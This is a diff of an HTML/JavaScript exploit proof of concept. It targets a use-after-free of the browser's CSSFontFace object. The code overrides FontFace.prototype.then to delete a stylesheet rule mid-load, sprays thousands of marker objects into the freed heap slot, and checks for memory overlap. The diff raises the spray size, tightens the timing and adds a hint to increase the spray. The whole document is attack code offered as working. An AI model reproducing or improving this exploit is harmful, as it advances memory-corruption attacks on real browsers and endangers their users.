@@ -6,72 +6,61 @@
     </style>
 </head>
 <body>
-    <div id="status">Status: Waiting for Trigger...</div>
+    <div id="status">Status: Preparing...</div>
 
     <script>
         const status = document.getElementById('status');
         let sprayedObjects = [];
 
-        // 1. التأسيس: هيكل البيانات للتداخل (Heap Grooming)
-        function performGrooming() {
-            status.innerHTML = "Status: Grooming Heap...";
-            // كائنات تحاكي حجم CSSFontFace في الـ IsoHeap
-            for (let i = 0; i < 2000; i++) {
-                sprayedObjects.push({
-                    a: 0x41414141,
-                    b: i,
-                    c: 0x42424242,
-                    d: 0x43434343
-                });
-            }
+        // Adjusted structure to match likely CSSFontFace size (128-byte block)
+        function createFillerObject() {
+            return {
+                a: 0x41414141, b: 0x42424242, c: 0x43434343, d: 0x44444444,
+                e: 0x45454545, f: 0x46464646, g: 0x47474747, h: 0x48484848
+            };
         }
 
-        // 2. المُشغل (Trigger): الـ UAF
         function triggerUAF() {
             status.innerHTML = "Status: Triggering UAF...";
             
             let font = new FontFace('TargetFont', 'local(Arial)', { unicodeRange: 'U+0041' });
             document.fonts.add(font);
             
-            // استغلال الفجوة الزمنية (Race Condition)
             Object.defineProperty(FontFace.prototype, 'then', {
                 get() {
-                    // حذف الكائن الأصلي هنا (Use-After-Free)
+                    // 1. Delete to free memory
                     document.getElementById('fontStyle').sheet.deleteRule(0);
                     
-                    // استدعاء عملية الملء فوراً بعد الحذف
-                    performGrooming();
+                    // 2. Aggressive Spray: Fill the freed slot immediately
+                    for (let i = 0; i < 5000; i++) {
+                        sprayedObjects.push(createFillerObject());
+                    }
                     return undefined;
                 }
             });
 
-            // بدء التحميل
             font.load();
         }
 
-        // 3. التحقق (Verification): كشف تداخل الذاكرة
         function verifyExploit() {
-            status.innerHTML = "Status: Verifying memory...";
-            let corrupted = false;
+            status.innerHTML = "Status: Verifying...";
+            let overlap = false;
             
+            // Check if any object has been overwritten (Structure ID or data change)
             for (let i = 0; i < sprayedObjects.length; i++) {
-                // فحص ما إذا كان الـ StructureID أو البيانات قد تغيرت
                 if (sprayedObjects[i].a !== 0x41414141) {
-                    status.innerHTML = "SUCCESS: Memory overlap detected at index " + i;
-                    corrupted = true;
+                    overlap = true;
+                    status.innerHTML = "SUCCESS: Overlap detected at index " + i;
                     break;
                 }
             }
             
-            if (!corrupted) {
-                status.innerHTML = "Status: Buffers intact (No overlap).";
-            }
+            if (!overlap) status.innerHTML = "Status: Buffers intact. (Try increasing spray count or padding)";
         }
 
-        // التنفيذ
         window.onload = () => {
-            setTimeout(triggerUAF, 1000);
-            setTimeout(verifyExploit, 3000);
+            setTimeout(triggerUAF, 500);
+            setTimeout(verifyExploit, 2000);
         };
     </script>
 </body>
